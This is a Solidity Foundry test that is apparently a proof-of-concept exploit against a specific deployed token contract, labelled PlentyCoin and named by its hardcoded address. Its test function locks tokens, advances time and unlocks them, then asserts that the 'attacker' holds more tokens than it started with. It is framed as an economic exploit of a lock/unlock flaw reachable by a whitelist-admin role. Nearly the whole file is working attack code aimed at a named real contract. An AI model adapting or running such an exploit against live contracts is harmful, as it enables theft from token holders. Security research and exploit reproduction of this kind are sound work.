// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface Plenty {
    function balanceOf(address account) external view returns (uint256);
    function lock(bytes32 reason, uint256 amount, uint256 time) external;
    function getUnlockableTokens(address account) external view returns (uint256);
    function unlock(address account) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418;
    address attacker = address(this);
    Plenty public PLENTY;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        PLENTY = Plenty(TARGET);
        vm.label(TARGET, "PlentyCoin Contract");
        vm.label(attacker, "Attacker");

        // Inject tokens to attacker
        uint256 lockAmount = 1000000 * 1e18;
        deal(TARGET, attacker, lockAmount * 10);

        // Verify attacker has tokens
        require(PLENTY.balanceOf(attacker) >= lockAmount, "Attacker needs tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = PLENTY.balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Step 1: Lock tokens (attacker is WhitelistAdmin from initialization)
        bytes32 lockReason = keccak256("test_lock");
        uint256 lockTime = 1 seconds;
        uint256 lockAmount = 1000000 * 1e18;

        PLENTY.lock(lockReason, lockAmount, lockTime);
        console.log("Locked", lockAmount, "tokens");

        // Record balance after lock
        uint256 balanceAfterLock = PLENTY.balanceOf(attacker);
        console.log("Balance after lock:", balanceAfterLock);
        require(balanceAfterLock < initialBalance, "Balance should decrease after lock");

        // Step 2: Warp time to expire lock
        vm.warp(block.timestamp + lockTime + 1);
        console.log("Time warped, lock expired");

        // Step 3: Unlock tokens
        uint256 unlockableBefore = PLENTY.getUnlockableTokens(attacker);
        console.log("Unlockable tokens:", unlockableBefore);

        PLENTY.unlock(attacker);
        console.log("Unlocked tokens");

        // Record final balance
        uint256 finalBalance = PLENTY.balanceOf(attacker);
        console.log("Final balance:", finalBalance);

        // Assert balance increased from post-lock state
        assertGt(finalBalance, balanceAfterLock, "Attacker balance should increase after unlock");

        uint256 finalBalanceCheck = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalanceCheck, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

